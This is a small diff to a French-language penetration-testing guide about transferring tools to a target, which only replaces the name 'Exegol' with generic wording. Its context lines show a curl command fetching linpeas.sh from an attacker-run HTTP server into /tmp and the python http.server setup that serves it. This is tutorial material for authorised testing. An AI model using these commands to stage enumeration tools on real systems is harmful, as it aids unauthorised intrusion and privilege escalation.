@@ -47,7 +47,7 @@ curl -o /tmp/linpeas.sh http://<IP_CIBLE>:8080/linpeas.sh
 {% endtab %}
 {% endtabs %}
 
-**Serveur HTTP cote attaquant (Exegol) :**
+**Serveur HTTP cote attaquant (votre machine d'attaque) :**
 
 ```bash
 python3 -m http.server 8080
@@ -116,7 +116,7 @@ netstat -lnpt | grep ssh
 
 La methode la plus courante en mission :
 
-1. Sur Exegol, placer les outils dans un repertoire dedie et demarrer un serveur HTTP :
+1. Sur la plupart des distributions offensives, placer les outils dans un repertoire dedie et demarrer un serveur HTTP :
 
 ```bash
 mkdir /tmp/transfert && cp linpeas.sh /tmp/transfert/
